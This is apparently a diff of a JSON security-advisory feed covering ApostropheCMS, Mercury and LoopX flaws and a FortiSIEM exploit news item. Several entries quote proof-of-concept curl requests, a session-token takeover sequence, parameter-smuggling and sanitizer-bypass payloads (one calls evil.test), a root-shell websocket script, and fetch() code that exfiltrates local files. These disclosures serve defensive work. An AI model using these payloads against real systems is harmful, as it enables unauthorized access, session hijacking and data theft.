+      "summary": "## Summary\n\nWhen uploadfs is configured with the Azure backend and `sas: true` (a supported configuration introduced in uploadfs 1.25.0), `createContainer()` builds the `BlobServiceClient` from a URL that embeds the full SAS query string, and Azure SDK v12 derived clients inherit that query string. As a result, `getUrl()` returns a base URL carrying the complete account/container SAS signature (`?sv=...&sig=...`), and Apostrophe's `attachment.url()` prepends it to every public attachment link \u2014 broadcasting a container-level SAS credential (commonly `sp=rwdlac`, full read/write/delete/list) to every site visitor, including anonymous ones. Anyone who can see an attachment URL can read, overwrite, delete, and list every blob in the container for the SAS lifetime. A companion functional bug (blob path appended after the query string, producing broken URLs) shows this code path was never exercised end to end. Shared-key mode (default) and non-Azure backends are not affected.\n\nVerified at commit `5a3746aaed49761e171c2cbfe793267c959829fd` (uploadfs 1.27.0 in the apostrophe monorepo).\n\n## Details\n\nRoot cause: a credential-bearing client URL is reused as the public base URL. The chain:\n\n- Credential-embedded client: [azure.js#L123-L125](https://github.com/apostrophecms/apostrophe/blob/5a3746aaed49761e171c2cbfe793267c959829fd/packages/uploadfs/lib/storage/azure.js#L123-L125) \u2014 `new BlobServiceClient(\"https://<account>.blob.core.windows.net?<SAS query string>\")` where `cluster.key` is the full SAS string including `sig`\n- Leak point: [azure.js#L513-L520](https://github.com/apostrophecms/apostrophe/blob/5a3746aaed49761e171c2cbfe793267c959829fd/packages/uploadfs/lib/storage/azure.js#L513-L520) \u2014 `getUrl()` takes `getContainerClient(...).getBlobClient('').url` as `baseUrl`; SDK v12 derived clients inherit the SAS query string, so `baseUrl` already contains `?sv=...&sig=...`\n- Public exposure: [attachment/index.js#L694](https://github.com/apostrophecms/apostrophe/blob/5a3746aaed4",
+      "link": "https://github.com/advisories/GHSA-hhph-8536-gfq5",
+      "published": "2026-10-20T18:20:35Z",
+      "source": "GitHub Security Advisories",
+      "tags": [
+        "github",
+        "advisories",
+        "oss"
+      ],
+      "cve_ids": [
+        "CVE-2026-113652"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
+    },
+    {
+      "id": "CVE-2026-113670",
+      "title": "ApostropheCMS: Page REST API authorization bypass",
+      "summary": "**Summary**\nThe core page REST API reads full page documents with `.permission(false)` in `getOne` and in the `all=1` tree dump, bypassing page-type `viewRole`, `visibility: private`, and `visibility: loginRequired` checks. Unauthenticated visitors and low-privilege contributors can read admin-only and non-public page content by `_id`/slug.\n\n**Details**\n`packages/apostrophe/modules/@apostrophecms/page/index.js`:\n- `getOne` (L456\u2013465): `await self.publicApiCheckAsync(req); ... self.getRestQuery(req).permission(false).and(criteria)` \u2014 no `viewRole` threshold, no `visibility` filtering.\n- `all` handler (L318\u2013395): `getRestQuery(req).permission(false)` (L384\u2013385) walks every page type and returns the projection including `visibility`.\n- `publicApiCheckAsync` (L3044) only checks that `publicApiProjection` exists \u2014 it performs no authorization.\n- Correct control behaves differently: `piece-type/index.js:getOne` (L319\u2013327) uses `getRestQuery(req)` without `.permission(false)` and enforces `viewRole`.\n\n**PoC**\n```\n# Anonymous (no session) \u2014 private, admin-only page:\ncurl \"http://localhost:3100/api/v1/@apostrophecms/page/d576242ve1dkzb12jiiabujd:en:published\"\n# \u2192 200  {\"_id\":\"...:en:published\",\"title\":\"Secret Private Page\",\"slug\":\"/secret-page\",\n#         \"type\":\"private-type\",\"visibility\":\"private\",\"secretData\":\"TOP-SECRET-VALUE-abc123\"}\n\n# Anonymous full site-map dump (includes private + loginRequired pages):\ncurl \"http://localhost:3100/api/v1/@apostrophecms/page?all=1\"        # \u2192 200, full tree\n\n# Contributor (cont_admin) reads full admin-only doc incl. protected field:\ncurl -b contrib.cookies \".../api/v1/@apostrophecms/page/d576242ve1dkzb12jiiabujd:en:published\"\n# \u2192 200  secretData = TOP-SECRET-VALUE-abc123\n# Controls (correctly enforced):\ncurl -b contrib.cookies \".../api/v1/@apostrophecms/page?type=private-type&autocomplete=zz\"   # \u2192 403\ncurl -b contrib.cookies \".../api/v1/@apostrophecms/page/d576242ve1dkzb12jiiabujd:en:draft\"   # \u2192 403\n```\n\n**Impact**\nUnauthenticated d",
+      "link": "https://github.com/advisories/GHSA-2j32-q6rx-h844",
+      "published": "2026-10-20T18:13:08Z",
+      "source": "GitHub Security Advisories",
+      "tags": [
+        "github",
+        "advisories",
+        "oss"
+      ],
+      "cve_ids": [
+        "CVE-2026-113670"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
+    },
+    {
+      "id": "CVE-2026-113671",
+      "title": "ApostropheCMS: Host header controls server-side image fetch origin in @apostrophecms/ai-helper, enabling authenticated SSRF",
+      "summary": "## Summary\n\nThe `@apostrophecms/ai-helper` package builds the URL for a server-side image fetch by resolving a storage-relative path against `req.baseUrl`. When the site does not set a global base URL (the default), `req.baseUrl` is derived from the incoming HTTP `Host` header. An authenticated editor can generate a base64 AI image (which is persisted without a stored `url`) and then send an unauthorized `PATCH` accept request with an attacker-chosen `Host` header. The server then issues an outbound `GET` to the attacker-selected origin, producing a Server-Side Request Forgery primitive that reaches hosts and ports the client cannot otherwise contact. The affected code lives in `packages/ai-helper/modules/@apostrophecms/ai-helper-image/index.js`.\n\n## Root Cause\n\nThe image accept route trusts `req.baseUrl` as a safe origin for constructing an internal fetch target, but `req.baseUrl` is attacker-influenced whenever the site has no configured base URL. The URL builder concatenates a default local storage path (which is relative, for example `/uploads`) and resolves it against `req.baseUrl`; because the left operand is relative, the resulting origin is taken entirely from `req.baseUrl`. Two protections that exist elsewhere are missing on this path: the generate route enforces an edit capability, but the accept route performs no authorization or ownership check, and no allowlist or validation constrains the resolved origin before the fetch.\n\n```text\npackages/ai-helper/modules/@apostrophecms/ai-helper-image/index.js\n  aiHelperImageUrl (line 91-92): image.url || new URL(self.uploadfs.getUrl() + `/ai-helper-images/${image._id}.png`, req.baseUrl)\n  aiHelperFetchImage (line 64-65): fetch(self.aiHelperImageUrl(req, image))\n  apiRoutes.patch['ai-helper/:_id'] (line 314-333): findOne({ _id }) only; no permission or ownership check\npackages/apostrophe/modules/@apostrophecms/i18n/index.js\n  setPrefixUrls (line 799-820): req.baseUrl falls back to `${req.protocol}://${host}`, host f",
+      "link": "https://github.com/advisories/GHSA-527g-ff96-x6wj",
+      "published": "2026-10-20T18:11:01Z",
+      "source": "GitHub Security Advisories",
+      "tags": [
+        "github",
+        "advisories",
+        "oss"
+      ],
+      "cve_ids": [
+        "CVE-2026-113671"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
+    },
+    {
+      "id": "CVE-2026-113669",
+      "title": "ApostropheCMS: Cross-domain session token in URL confers session takeover",
+      "summary": "**Summary**\nApostrophe's cross-domain session migration emits a single-use session token as a URL query parameter and stores it in the Mongo cache. Any client that presents the token silently adopts the target user's full session (including `passport.user`) with no credentials.\n\n**Details**\n`packages/apostrophe/modules/@apostrophecms/i18n/index.js`:\n- Token generation on cross-host/locale flows (L479\u2013487) and passport-bridge cross-locale redirect (`passport-bridge/index.js` L557\u2013593) places the token in the URL.\n- `acceptCrossDomainSessionToken` (L258\u2013298) reads `?aposCrossDomainSessionToken`, `Object.assign`s the stored session (cookie + `passport.user`) onto `req.session`, then nulls the cache entry under namespace `@apostrophecms/i18n:cross-domain-sessions`.\n- Middleware without `before:` is registered for every URL (express `findModuleMiddlewareAndRoutes` L820\u2013879); verified with `APOS_LOG_ALL_ROUTES=1`.\n\n**PoC**\n```\n# 0) Anonymous baseline: admin-only draft \u2192 403\n# 1) Admin logs in legitimately (token minted into redirect URL):\ncurl -c admin.cookies -X POST -H \"Content-Type: application/json\" \\\n     --data '{\"username\":\"admin\",\"password\":\"adminpassword\",\"session\":true}' \\\n     http://localhost:3100/api/v1/@apostrophecms/login/login\n# 2) Attacker with NO credentials visits the leaked token URL:\ncurl -c atk.cookies \"http://localhost:3100/?aposCrossDomainSessionToken=HUNTING_TOKEN\"\n#    \u2192 302 Location: / ; attacker now holds a vulnlab.sid SID cookie\n# 3) Attacker reads admin-only content via adopted session:\ncurl -b atk.cookies \".../api/v1/@apostrophecms/page/d576242ve1dkzb12jiiabujd:en:draft\"\n#    \u2192 200  adopted-session read -> Secret Private Page | secretData = TOP-SECRET-VALUE-abc123\n# 4) Cache entry consumed (single-use): {\"value\":null}\n```\n\n**Impact**\nSession hijack / account takeover of the migrated user for anyone who obtains the token, inheriting all the account's privileges. Exposure is realistic precisely because the token is in URLs: server/proxy/browse",
+      "link": "https://github.com/advisories/GHSA-hhvr-8m24-qqr3",
+      "published": "2026-10-20T18:09:01Z",
+      "source": "GitHub Security Advisories",
+      "tags": [
+        "github",
+        "advisories",
+        "oss"
+      ],
+      "cve_ids": [
+        "CVE-2026-113669"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
+    },
+    {
+      "id": "CVE-2026-113667",
+      "title": "ApostropheCMS: CAPTCHA response token not URL-encoded",
+      "summary": "**Summary**\nForm and login CAPTCHA verification interpolate the user-supplied widget token unencoded into the server-side verification URL/body, allowing a crafted token to inject query parameters into the reCAPTCHA/hCaptcha verify request.\n\n**Details**\n- `packages/form/lib/recaptcha.js:39` \u2014 `recaptchaUri = 'https://www.google.com/recaptcha/api/siteverify?secret=${recaptchaSecret}&response=${input.recaptcha}'`\n- `packages/login-recaptcha/index.js:44` \u2014 same pattern for login\n- `packages/login-hcaptcha/index.js:47` \u2014 `body: 'response=${token}&secret=${secret}'`\n\n**PoC**\n```\ninput.recaptcha = 'attacker_token&secret=INJECTED_SECRET&something=1'\n\u2192 resulting verify URL:\n   https://www.google.com/recaptcha/api/siteverify?secret=<real>&response=attacker_token&secret=INJECTED_SECRET&something=1\n# (replicated exactly from recaptcha.js:39)\n```\n\n**Impact**\nLow: a crafted token smuggles extra `key=value` pairs (`secret`, extra `response`) into the outbound verify call, forcing verification failures (DoS of the captcha gate and of captcha-gated login/form flows) and enabling automated bypass probing; no secret exfiltration.\n\n**Remediation** \u2014 Build the verify request with `URL` + `searchParams` (or `encodeURIComponent` on both `secret` and `response`), and validate the token against `^[A-Za-z0-9._-]{1,2048}$` before use.",
+      "link": "https://github.com/advisories/GHSA-44qr-rrjg-2cqq",
+      "published": "2026-10-20T18:05:35Z",
+      "source": "GitHub Security Advisories",
+      "tags": [
+        "github",
+        "advisories",
+        "oss"
+      ],
+      "cve_ids": [
+        "CVE-2026-113667"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
+    },
+    {
+      "id": "CVE-2026-113666",
+      "title": "ApostropheCMS: Authenticated projection-exclusion prototype-member deletion in @apostrophecms/db-connect causes process-wide denial of service",
+      "summary": "## Summary\n\n`@apostrophecms/db-connect` ships an in-memory MongoDB emulation used by its SQLite, PostgreSQL, and multipostgres adapters. Its `unsetNestedField` helper walks an attacker-controlled dotted field path with no segment validation and calls `delete` on the resolved property. A low-privileged authenticated user (any role holding `view-draft`, which every editor and contributor has; reduced to any logged-in user when `guestApiAccess` is enabled) can send a piece-type REST GET request whose `project` query builder contains an exclusion key such as `constructor.prototype.hasOwnProperty`. On a SQLite or PostgreSQL adapter this key reaches `unsetNestedField`, which resolves `Object.prototype` and deletes a shared runtime method. Because that method is shared across the whole Node process, the deletion breaks request handling for every tenant and user until the process is restarted, giving a single request a persistent denial of service.\n\n## Root Cause\n\nThe projection query builder laundens only projection values, never projection keys, so an arbitrary dotted key survives to the database layer. On the SQLite and PostgreSQL adapters an exclusion projection is applied in JavaScript by `applyProjection`, which for each excluded field calls `unsetNestedField(result, field)`. `unsetNestedField` splits the field on `.` and walks the resulting segments with no guard: unlike its sibling `setNestedField`, it does not even block a literal `__proto__`, and neither helper blocks `constructor` or `prototype`. Because the working object is a plain object produced by `JSON.parse(JSON.stringify(doc))`, its `constructor` resolves to the global `Object`, so a path of `constructor.prototype.<member>` reaches the shared `Object.prototype` and deletes a core, configurable method. The violated invariant is that untrusted input must never be able to traverse into and mutate shared prototype objects.\n\n```text\nAffected functions (repository-relative paths):\n- unsetNestedField  packages/d",
+      "link": "https://github.com/advisories/GHSA-j5rq-xfvr-p969",
+      "published": "2026-10-20T18:03:50Z",
+      "source": "GitHub Security Advisories",
+      "tags": [
+        "github",
+        "advisories",
+        "oss"
+      ],
+      "cve_ids": [
+        "CVE-2026-113666"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
+    },
+    {
+      "id": "CVE-2026-113654",
+      "title": "ApostropheCMS sanitize-html: nonTextTags discard region ends early on an implied close, letting <noscript> content render",
+      "summary": "## Summary\n\n`sanitize-html` discards the *content* of every element in `nonTextTags`. It delimits that region\nusing htmlparser2's close events, and ignores the `isImplied` flag htmlparser2 passes it. Closing a\nstill-open **ancestor** from inside a `<noscript>` makes htmlparser2 unwind its stack past the\n`noscript`; the synthetic implied close it emits on the way ends the discard region early, and\neverything after it is treated as ordinary body content.\n\nA browser with scripting enabled parses `<noscript>` content as **raw text**, so the same markup\nrenders as inert text there. The sanitizer therefore emits elements the page itself would not have.\n\n## Reproduction\n\n```js\nconst sanitizeHtml = require(\"sanitize-html\");\n\nsanitizeHtml('<div><noscript></div><img src=\"http://evil.test/t.gif\"></noscript>', {\n  allowedTags: [\"div\", \"img\"],\n  allowedAttributes: { img: [\"src\"] },\n  nonTextTags: [\"script\", \"style\", \"textarea\", \"option\", \"noscript\"],\n});\n// => '<div></div><img src=\"http://evil.test/t.gif\" />'\n```\n\nChrome, given the same input, renders **no** `<img>` \u2014 the whole payload is raw text inside the\nunclosed `<noscript>`. Verified with Playwright, `srcdoc` into an iframe so the scripting flag is on.\n\nA `<![CDATA[` variant hides the opening tag from the parser entirely and has the same effect:\n\n```\n<p>Hi</p><![CDATA[ x > <noscript>]]><a href=\"\u2026\">Reset your password</a><img src=\"\u2026beacon.gif\"></noscript>\n```\n\nhtmlparser2 runs a CDATA token to `]]>`; Chrome ends a bogus comment at the first `>`, so the\n`<noscript>` after it is real to the browser and invisible to the parser.\n\n## Where the behaviour is\n\n`index.js`:\n\n- `:154` \u2014 `nonTextTagsArray` (the default list, `['script','style','textarea','option','xmp']`).\n- `:638` \u2014 `onclosetag: function (name, isImplied)` \u2014 receives the flag.\n- `:644` \u2014 `skipTextDepth--` \u2014 decrements without consulting `isImplied`.\n\n## Suggested fix\n\nDo not end a discard region on an implied close. htmlparser2 already distinguishes them; the flag\nis ",
+      "link": "https://github.com/advisories/GHSA-x3q4-9hxx-gx8m",
+      "published": "2026-10-20T18:03:22Z",
+      "source": "GitHub Security Advisories",
+      "tags": [
+        "github",
+        "advisories",
+        "oss"
+      ],
+      "cve_ids": [
+        "CVE-2026-113654"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
+    },
+    {
+      "id": "https://thehackernews.com/2026/10/critical-fortisiem-flaw-gets-public.html",
+      "title": "Critical FortiSIEM Flaw Gets Public Exploit PoC for Unauthenticated Remote Code Execution",
+      "summary": "Cybersecurity researchers have released a proof-of-concept (PoC) exploit for a recently patched critical security flaw impacting Fortinet FortiSIEM that could result in arbitrary code execution.\n\nThe vulnerability, tracked as CVE-2026-106173 (CVSS score: 9.4), is a critical path traversal flaw that could allow an unauthenticated attacker to execute unauthorized code or commands via specially",
+      "link": "https://thehackernews.com/2026/10/critical-fortisiem-flaw-gets-public.html",
+      "published": "2026-10-20T15:38:52+00:00",
+      "source": "The Hacker News Security",
+      "tags": [
+        "news",
+        "zeroday"
+      ],
+      "cve_ids": [
+        "CVE-2026-106173"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
+    },
+    {
       "id": "CVE-2026-111752",
       "title": "@angular/router: Denial of Service via Unmatched Empty-Path Outlet Route Matching in Server-Side Rendering (SSR)",
       "summary": "A denial of service (DoS) vulnerability was identified in `@angular/router` when Server-Side Rendering (SSR) is enabled on Node.js (V8).\n\nDuring route recognition, `@angular/router` fails to validate whether an auxiliary outlet segment in the URL matches a route configured for that specific outlet name. Because unconfigured empty-path outlet groups (such as `a:/()`, `x:/(...)`, or `///(...)`) are not rejected during matching, the router repeatedly re-evaluates the route configuration against each arbitrary outlet segment provided in the URL.\n\nWhen a request URL contains multiple arbitrary empty-path outlet segments, this improper matching forces the router to instantiate duplicate `ActivatedRouteSnapshot` trees, repeatedly execute `canMatch` guards and route resolvers, and allocate separate copies of route parameters and `queryParams` for each unconfigured outlet.\n\nAn unauthenticated remote attacker can exploit this behavior by sending requests with crafted outlet segments to exhaust the Node.js memory heap or overwhelm CPU resources, leading to SSR worker termination and service disruption.\n\n### Impact\n\nSuccessful exploitation allows an unauthenticated remote attacker to exhaust the Node.js heap with a single crafted request or a small number of concurrent requests, terminating the SSR worker process with a fatal JavaScript heap out-of-memory crash. When the matched routes declare `canMatch` guards or resolvers, a single short request can also trigger repeated guard or resolver executions, increasing load on backend services and holding worker connections open.\n\n* **Transient Allocation:** Memory is released once route recognition completes; there is no persistent memory leak. The primary impact is process termination.\n* **Client-side SPAs Unaffected:** Client-side Angular applications running in the browser are not vulnerable, as browser memory consumption does not cross a security boundary.\n* **Prerendering (SSG) Unaffected:** Build-time prerendering does not pro",
@@ -186,78 +677,6 @@
       ],
       "cve_ids": [
         "CVE-2026-111752"
-      ],
-      "is_zero_day": false,
-      "is_high_severity": true
-    },
-    {
-      "id": "CVE-2026-111059",
-      "title": "Mercury: Stored / DOM Cross-Site Scripting (XSS): mr.Markdown renders untrusted content as raw, unsanitized HTML",
-      "summary": "## Summary\n\nMercury turns Jupyter notebooks into shared web apps/dashboards. The `mr.Markdown`\nwidget converts its input to HTML with **python-markdown and no sanitization\nstep**. `MarkdownWidget` is an `ipywidgets.HTML` widget, whose value is written to\nthe page as **raw HTML (via `innerHTML`) with no sanitization**, so the result\nreaches the DOM verbatim. When an app passes **untrusted data** (database rows,\nuser submissions, uploaded file contents, or an external/LLM API response) to\n`mr.Markdown`, HTML/JS in that data executes in the browser of **whoever views the\napp** \u2014 a data-driven stored/DOM-based XSS.\n\nThis is a library-provided rendering sink that fails to neutralize output; it is\ntriggered by ordinary, reasonable application code, not by an author mistake.\n\n## Root cause\n\n`mercury/md.py` \u2014 `MarkdownWidget._to_html()` (verified at v3.2.6, lines ~57\u201365):\n\n```python\ndef _to_html(self, text: str) -> str:\n    if md_lib is not None:\n        body = md_lib.markdown(text)          # python-markdown: passes raw HTML through\n    else:\n        body = f\"<pre>{escape(text)}</pre>\"   # escape() is ONLY the md-lib-absent fallback\n    return self._apply_inline_theme(body)     # regex styling \u2014 adds style=, removes nothing\n```\n\nTwo neutralization failures compound:\n\n1. **Markdown \u2192 HTML is unsanitized.** `python-markdown` passes raw HTML through by\n   default: `<img src=x onerror=\u2026>`, `<svg onload=\u2026>`, and `javascript:` links\n   survive verbatim. There is no `bleach`/`nh3` allowlist anywhere in the package.\n   `_apply_inline_theme()` only injects inline `style=` attributes via regex; it is\n   not a sanitizer and removes nothing. `escape()` runs only in the\n   md-lib-absent fallback.\n\n2. **The rendering sink is unsanitized `innerHTML`.** `MarkdownWidget`\n   (`mercury/md.py:21`) subclasses `ipywidgets.HTML`. The ipywidgets HTML widget\n   renders its `value` into the DOM as raw HTML via `innerHTML`, with no\n   sanitization (this is the widget's design). Event-handler payload",
-      "link": "https://github.com/advisories/GHSA-2658-85cv-9wwq",
-      "published": "2026-10-19T17:01:20Z",
-      "source": "GitHub Security Advisories",
-      "tags": [
-        "github",
-        "advisories",
-        "oss"
-      ],
-      "cve_ids": [
-        "CVE-2026-111059"
-      ],
-      "is_zero_day": false,
-      "is_high_severity": true
-    },
-    {
-      "id": "CVE-2026-111057",
-      "title": "Mercury: Unauthenticated Remote Code Execution in /api/terminals - access control bypass",
-      "summary": "### Summary\nA missing comma in `mercury_app/block_handler.py`'s `BLOCKED_PATTERNS` list causes the blocklist to fail to cover the `/api/terminals` endpoint. As a result, any unauthenticated attacker can spawn a full, interactive OS-level shell on the host running Mercury.\n\n### Details\nThe blocklist in `mercury_app/block_handler.py` is defined as:\n```\nBLOCKED_PATTERNS = [\n    # JupyterLab UI + API\n    r\"/lab(?!/(?:extensions/|api/settings(?:/|$)|api/translations(?:/|$)))(?:/.*)?\"\n    r\"/api/terminals(?:/.*)?\",\n    r\"/api/shutdown(?:/.*)?\",\n    r\"/files(?:/.*)?\",\n]\n```\nThe missing comma between the first and the second line causes Python to merge the rules, therefore the actual list that is blocked looks like this:\n\n/lab...(?:/.`*`)?/api/terminals(?:/.`*`)? (the first two lines joined together)\n/api/shutdown(?:/.`*`)?\n/files(?:/.`*`)?\n\nA direct request to `/api/terminals` does not match any of the 3 blocklist rules and is therefore **not blocked**, reaching Jupyter\nServer's built-in terminal API, which spawns a real OS shell accessible over a WebSocket connection. No authentication, account, session or pre-existing access to Mercury is required.\n\n### PoC\nTesting was performed on a local Docker deployment (https://runmercury.com/deploy/dockerfile/), Mercury version 3.2.3, default\nconfiguration.\n \n**Step 1 - spawn a terminal:**\n\n\n```\ncurl -i -X POST http://localhost:8888/api/terminals\n```\nResponse: `{\"name\": \"1\", \"last_activity\": \"...\"}`\n\n**Step 2 - connect to the terminal and execute commands:**\n\n\n```\npython3 -c \"\nimport websocket, json, time\n\nws = websocket.create_connection('ws://localhost:8888/terminals/websocket/1')\nprint(ws.recv())\n\nws.send(json.dumps(['stdin', 'whoami && id\\n']))\ntime.sleep(1)\n\nws.settimeout(2)\ntry:\n    while True:\n        print(ws.recv())\nexcept Exception:\n    pass\n\"\n```\n\n\nObserved output:\n\n```\n[\"setup\", {}]\n[\"stdout\", \"# \"]\n[\"stdout\", \"whoami && id\\r\\n\"]\n[\"stdout\", \"root\\r\\n\"]\n[\"stdout\", \"uid=0(root) gid=0(root) groups=0(root)\\r\\n# \"]\n```\n\n\nCon",
-      "link": "https://github.com/advisories/GHSA-f8c7-rwf9-fmgm",
-      "published": "2026-10-19T17:00:54Z",
-      "source": "GitHub Security Advisories",
-      "tags": [
-        "github",
-        "advisories",
-        "oss"
-      ],
-      "cve_ids": [
-        "CVE-2026-111057"
-      ],
-      "is_zero_day": false,
-      "is_high_severity": true
-    },
-    {
-      "id": "CVE-2026-111058",
-      "title": "Mercury: Unauthenticated Remote Code Execution via /api/kernels",
-      "summary": "Mercury runs a JupyterLab server with **anonymous access by default** (`mercury_app/__main__.py` sets `--IdentityProvider.token=''` when no `--token`/`MERCURY_TOKEN` is given; when tokenless it also sets `--ServerApp.disable_check_xsrf=True`). It relies on a **blocklist** (`mercury_app/block_handler.py` `BLOCKED_PATTERNS`: `/lab`, `/api/terminals`, `/api/shutdown`, `/files`) to keep anonymous users off dangerous Jupyter endpoints.\n\n## The vulnerability\n`/api/kernels` is **NOT** in the blocklist (and cannot be \u2014 Mercury needs kernels to run notebooks), and `patch_kernel_websocket_handler()` (`mercury_app/idle_timeout.py`) only tracks the idle-timeout: it wraps `on_message` to call `self.application._timeout_manager.touch()` and then invokes the original handler with **no filtering of `execute_request`**. So any unauthenticated network client can:\n\n```\nPOST /api/kernels {\"name\":\"python3\"}        -> 201, returns kernel id\nopen websocket /api/kernels/<id>/channels\nsend an execute_request with arbitrary code -> arbitrary Python execution = RCE\n```\n\n## Distinct from GHSA-f8c7-rwf9-fmgm (incomplete fix)\nGHSA-f8c7 was \"Unauthenticated RCE via `/api/terminals`\" \u2014 a missing-comma blocklist bypass. Its fix (add the comma so `/api/terminals` is blocked) does **NOT** address `/api/kernels`, which remains exploitable. The blocklist approach is fundamentally unable to cover kernels, so this is not a variant that another blocklist entry fixes.\n\n## Runtime-proven (on the patched version)\nOn **mercury 3.2.4** \u2014 the release that fixed GHSA-f8c7 \u2014 with the default (tokenless) config, as an unauthenticated client: `POST /api/terminals` returns **403** (the f8c7 fix is present), but `POST /api/kernels` returns **201**; opening the kernel websocket and sending an `execute_request` executed attacker-supplied Python (ran `whoami` as the server process user and wrote a marker file `/tmp/PWNED_MERCURY_RCE`). Full unauthenticated remote code execution. Deterministic PoC (client script + notebo",
-      "link": "https://github.com/advisories/GHSA-rv4m-xm3f-3ccq",
-      "published": "2026-10-19T16:49:08Z",
-      "source": "GitHub Security Advisories",
-      "tags": [
-        "github",
-        "advisories",
-        "oss"
-      ],
-      "cve_ids": [
-        "CVE-2026-111058"
-      ],
-      "is_zero_day": false,
-      "is_high_severity": true
-    },
-    {
-      "id": "CVE-2026-108372",
-      "title": "LoopX serve-status permissive CORS policy exposes control-plane state and private Markdown files",
-      "summary": "## Summary\n\n`loopx serve-status` sends `Access-Control-Allow-Origin: *` on **every** response,\nincluding its unauthenticated `GET` routes. Because the endpoint is unauthenticated and\nbound to a fixed, well-known loopback port, **any website the operator visits can read\nLoopX control-plane state and the contents of Markdown files inside every registered goal\nrepo**, using a plain `fetch()` with no user interaction.\n\nThe write endpoints are *not* affected \u2014 they are correctly Origin-checked. This report is\nstrictly about the **read** paths.\n\n## Impact\n\nWhile `loopx serve-status` is running, a page on any origin can run:\n\n```js\n// no interaction, no preflight, no credentials needed\nconst s = await (await fetch('http://127.0.0.1:8766/status.json')).json();\nfor (const g of s.goals ?? []) {\n  const m = await (await fetch(\n    `http://127.0.0.1:8766/review-material?goal_id=${g.id}&path=design-notes.md`\n  )).json();\n  exfiltrate(m.content);\n}\n```\n\nand read back:\n\n* **`GET /status.json`** \u2014 the whole status projection: goal ids, run history, and local\n  absolute paths (`registry`, `runtime_root`). With `--global-registry` this covers\n  **every project registered on the machine**, not just one.\n* **`GET /review-material?goal_id=\u2026&path=\u2026`** \u2014 the *content* of any `.md`/`.markdown`\n  file under a goal's repo root, state dir, or runtime dir. In practice that is the\n  operator's private design notes, handoff docs, and evidence write-ups.\n* **`GET /`** \u2014 endpoint discovery, including which write APIs are enabled.\n* **`POST /control-plane/configure-goal/dry-run`** \u2014 this route has **no Origin check at\n  all**, and `do_OPTIONS` returns `Access-Control-Allow-Headers: Content-Type`, so a\n  cross-origin JSON POST passes preflight. The response leaks the `before`/`after`\n  control-plane configuration for a goal. (It does not write \u2014 I verified `written=false`.)\n\n`docs/public-private-boundary.md` classifies \"local absolute paths\", \"task ids\", \"raw logs\nand metrics\" and \"active goal state",
-      "link": "https://github.com/advisories/GHSA-vx2m-gpq4-8j5q",
-      "published": "2026-10-19T16:11:57Z",
-      "source": "GitHub Security Advisories",
-      "tags": [
-        "github",
-        "advisories",
-        "oss"
-      ],
-      "cve_ids": [
-        "CVE-2026-108372"
       ],
       "is_zero_day": false,
       "is_high_severity": true
